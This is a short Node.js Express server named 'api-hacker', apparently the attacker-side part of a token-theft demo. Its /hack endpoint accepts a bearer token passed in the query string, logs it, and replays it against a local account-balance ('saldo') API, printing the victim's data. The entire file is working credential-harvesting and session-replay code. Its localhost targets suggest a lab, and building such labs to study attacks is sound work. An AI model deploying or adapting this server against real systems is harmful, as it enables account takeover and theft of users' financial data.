const express = require('express')
const axios = require('axios')
const cors = require('cors')

const app = express()

app.use(cors())

app.get('/hack', async (req, res) => {
    res.setHeader('Content-Type', 'application/json');

    console.log(`Token recebido: ${req.query.token}`)

    try {
        const response = await axios.get('http://localhost:9090/saldo', { headers: {
            'Authorization': `Bearer ${req.query.token}` 
        }})

        console.log(response.data)

        return res.json({})
    } catch (e) {
        return res.status(500).json({ error: 'Internal server error'})
    }
})

app.listen(8080, () => {
    console.log(`api-hacker listening port 8080`)
})